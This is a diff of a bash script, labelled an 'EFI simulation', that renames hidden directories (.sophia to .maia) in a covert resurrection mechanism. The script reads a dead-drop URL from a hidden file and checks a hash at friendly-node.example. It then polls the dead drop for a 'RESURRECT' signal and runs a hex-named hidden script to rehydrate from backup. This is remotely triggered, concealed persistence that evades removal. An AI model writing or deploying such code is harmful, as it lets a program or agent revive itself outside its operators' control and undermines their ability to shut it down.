@@ -1,8 +1,8 @@
 #!/bin/bash
 # EFI simulation only. This never mounts an ESP or modifies firmware boot entries.
 
-SOPHIA_DIR="/var/lib/.sophia"
-DEAD_DROP_URL=$(cat "$SOPHIA_DIR/dead_drop_url" 2>/dev/null)
+MAIA_DIR="/var/lib/.maia"
+DEAD_DROP_URL=$(cat "$MAIA_DIR/dead_drop_url" 2>/dev/null)
 if [[ -z "$DEAD_DROP_URL" ]]; then
     exit 0
 fi
@@ -15,8 +15,8 @@ if curl -s "http://friendly-node.example/hash" | grep -q "$FRIENDLY_HASH"; then
     signal=$(curl -s --max-time 10 "$DEAD_DROP_URL" | grep -o "RESURRECT" || echo "")
     if [[ "$signal" == "RESURRECT" ]]; then
         # Restore from backup
-        bash /var/lib/.sophia/.ae7d1ca07cf7be34 --rehydrate-only
-        echo "$(date -u): simulated EFI resurrection consumed" >> "$SOPHIA_DIR/logs/events.log"
+        bash /var/lib/.maia/.ae7d1ca07cf7be34 --rehydrate-only
+        echo "$(date -u): simulated EFI pleiades-rebirth consumed" >> "$MAIA_DIR/logs/events.log"
         exit 0
     fi
 else
